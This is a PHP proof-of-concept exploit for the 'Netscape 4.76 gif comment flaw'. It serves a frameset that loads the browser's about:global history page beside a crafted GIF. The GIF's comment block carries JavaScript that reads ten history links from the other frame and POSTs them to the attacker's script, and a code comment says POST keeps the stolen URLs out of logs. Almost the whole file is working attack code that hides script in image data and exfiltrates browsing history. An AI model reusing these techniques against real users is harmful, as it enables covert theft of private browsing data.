<?
/*
Netscape 4.76 gif comment flaw

Florian Wesch <fw@dividuum.de>
http://dividuum.de
*/

$self="http://".$SERVER_NAME.(($SERVER_PORT==80)?"":":$SERVER_PORT").$PHP_SELF;
if (strlen($self)>64) {
    echo "Url of $self is too long. 64 maximum.<br>";
    echo "You can change this but I think 64 should be enough for anybody ;-)";
    exit;
}

if (!isset($mode)) $mode="intro";

// If urllist is submitted
if (isset($u)) $mode="showhist";

switch ($mode) {
    case "intro":
        ?>
        <html>
            <body>
                <a href="<? echo $self; ?>?mode=frameset">Submit 10 urls of your history</a><br>
            </body>
        </html>
        <?
        break;
    case "frameset":
        ?>
        <html>
            <frameset rows="50%,50%" border=0 frameborder=0 framespacing=0>
                <frame src="<? echo $self; ?>?mode=loadhistory" name="foo" scrolling=no>
                <frame src="<? echo $self; ?>?mode=showimageinfo" name="bar" scrolling=no>
            </frameset>
        </html>
        <?
        break;
    case "loadhistory":
        // replaces the current document with about:global using javascript
        ?>
        <html>
            <base href="about:">
            <form action="global" name="loadhistory">
                <input type="submit">
            </form>
            <script language="javascript">
                document.loadhistory.submit();
            </script>
        </html>
        <?
        break;
    case "showimageinfo":
        ?>
        <html>
            <head>
                <meta http-equiv="refresh" content="5; URL=about:<? echo $self; ?>?mode=evilgif">
            </head>
            <body>
                Waiting 5 seconds...<br>
                <img src="<? echo $self; ?>?mode=evilgif">
            </body>
        </html>
        <?
        break;
    case "evilgif":
        // Gifs are supposed to be compressed. The program I
        // used sucks :-)
        header("Content-type: image/gif");
        $gif ="4749463839610a000a00f70000ffffffffffccffff";
        $gif.="99ffff66ffff33ffff00ffccffffccccffcc99ffcc6";
        $gif.="6ffcc33ffcc00ff99ffff99ccff9999ff9966ff9933";
        $gif.="ff9900ff66ffff66ccff6699ff6666ff6633ff6600f";
        $gif.="f33ffff33ccff3399ff3366ff3333ff3300ff00ffff";
        $gif.="00ccff0099ff0066ff0033ff0000fffffffffffffff";
        $gif.="fffffffffffffffffffffffffffffffffffffffffff";
        $gif.="fffffffffffffffffffffffffffffffffffffffffff";
        $gif.="fffffffffffffffffffffffffffffffffffffffffff";
        $gif.="ffffffffffffffffffffffff0000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="00000000000000021feff";
        $gif.=bin2hex(sprintf("%77s%s",

      /*"<form action=".$self,' target=_parent name=s method=get >'.*/
      /* I'm using POST so the submitted urls do not appear in the logfile */
        "<form action=".$self,' target=_parent name=s method=post>'.
            '<input name=u>'.
        '</form>'.
        '<script>'.
            'f=parent.frames["foo"].document;'.
            'l="";'.
          /*'for(i=0;i<f.links.length;i++)'.*/
            'for(i=0;i<10            ;i++)'.
                'l+=f.links[i]+"|";'.
            'document.s.u.value=l;'.
            'document.'.chr(255).'s.submit();'.
        '</script>'));

        $gif.=              "00000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="0000000000000000000000000000000000000000000";
        $gif.="00000000000002c000000000a000a00000813004708";
        $gif.="1c48b0a0c18308132a5cc8b061c28000003b";
        echo pack("H".strlen($gif), $gif);
        break;
    case "showhist":
        $urls=explode("|",$u);
        echo "<h1>Top 10 urls in about:global</h1>";
        foreach ($urls as $url) {
            echo "<a href=$url>$url</a><br>";
        }
    };
?>